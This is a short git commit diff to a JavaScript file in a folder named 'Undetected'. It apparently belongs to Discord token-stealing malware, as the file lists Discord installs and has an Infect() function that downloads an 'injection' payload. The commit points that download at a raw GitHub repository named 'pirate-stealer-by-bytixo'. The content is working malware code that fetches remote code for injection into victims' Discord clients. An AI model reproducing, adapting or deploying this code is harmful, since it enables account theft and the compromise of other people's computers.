1e265f11ae38ffee6f0dc9d5dc10769ed0165e39
Archemis <55634571+ugur014@users.noreply.github.com>
2022-04-21 19:42:03 +0400

    Update index.js

--- src/Undetected/index.js
+++ src/Undetected/index.js
@@ -43,7 +43,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/ugur014/ajwdbawjdbawjdbawjdbawjd/main/src/Injection/injection-clean', (resp) => {
+    https.get('https://raw.githubusercontent.com/jimisreallynoobyrn/pirate-stealer-by-bytixo/main/src/Injection/injection-clean', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
